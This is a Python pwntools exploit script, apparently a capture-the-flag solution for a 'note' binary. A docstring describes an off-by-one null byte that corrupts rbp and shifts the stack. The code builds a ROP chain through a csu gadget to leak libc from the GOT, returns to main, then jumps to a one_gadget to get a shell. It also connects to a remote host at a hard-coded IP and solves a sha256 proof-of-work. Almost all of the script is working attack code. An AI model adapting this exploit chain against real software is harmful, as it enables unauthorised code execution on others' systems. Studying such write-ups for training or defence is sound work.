#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

'''
    basic vuln:
        edit function, when input len=0x100, the LSB of rbp will be tampered to \x00, and cause a stack shifting.
        then we can pre-overwrite the first arg of scanf in main function, and trigger a stack overflow
        however, the main function's return addr cannot be exploit since it applies exit() at each exit of main func,
            so what we should do is overwriting the return addr of the sub-function, which requires the function can write data to stack area above its local variables, which means that it can write data to non-local variables
        and scanf comes the best one, since we can tamper the stack base ptr(rbp), we can rewrite the ret addr of scanf we it excute "scanf("%s",str);" and the start addr of str is lower that the local variables of scanf
        so we can achieve ROP and finally tamper the GOT to one_gadget addr

    what else:
        notice the differences between _isoc99_scanf and normal scanf, their asm codes are different (especially, isoc_scanf does not contain any operation like push rsp/rbp or leave)
'''

from pwn import *
from pwnlib.util.iters import bruteforce
from parse import *
import string
from hashlib import sha256
context.log_level="debug"
pwn_file="./note"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
libc_add=0
pid=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("47.89.18.224",10007)
    def brute_force(prefix,s):
        return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4)
    data=conn.recvline(keepends=False)
    prefix,s=parse("sha256(xxxx+{}) == {}",data)
    conn.sendline(brute_force(prefix,s))

    pid=0

def debug():
    log.debug("libc address:0x%x"%libc_add)
    log.debug("process pid:%d"%pid)
    pause()

def edit(s):
    conn.sendlineafter("> ","1")
    conn.sendlineafter("Note:",s)

def show():
    conn.sendlineafter("> ","2")
    conn.recvuntil("Note:")
    return conn.recvline(keepends=False)

def save():
    conn.sendlineafter("> ","3")
    conn.recvuntil("Saved!\n");

def changeID(s):
    conn.sendlineafter("> ","4")
    conn.sendlineafter("Input your ID:",s)

def exit():
    conn.sendlineafter("> ","5")

ID={
    0:"a\x00",
    0xc0:"%s\x00",
}
gdb.attach(conn,'b *0x400eb4\nc')
conn.sendlineafter("Input your ID:",fit(ID,filler="a"))

f={
    0xa8:p64(0x602100),
}
edit(fit(f,length=0x100))
rop="a"*0x64
rop+=p64(0x0400FFA)# ret to csu : leak libc
rop+=p64(0)# rbx
rop+=p64(1)# rbp
rop+=p64(elf.got["puts"])#r12
rop+=p64(0)# r13
rop+=p64(0)# r14
rop+=p64(elf.got["puts"])# r15
rop+=p64(0x400FE0)
rop+=p64(0)
rop+=p64(0)
rop+=p64(0)# rbx
rop+=p64(0)
rop+=p64(0)
rop+=p64(0)
rop+=p64(0)
rop+=p64(0x400e3f)# jmp to main
rop+=","
conn.sendlineafter("> ",rop)

libc_add=u64(conn.recvline().ljust(8,"\x00"))-libc.symbols["puts"]

conn.sendlineafter("Input your ID:","a")
edit(fit(f,length=0x100))
conn.sendlineafter("> ","a"*0x64+p64(libc_add+0x4526a)+"\x00"*0x40+",")

conn.interactive()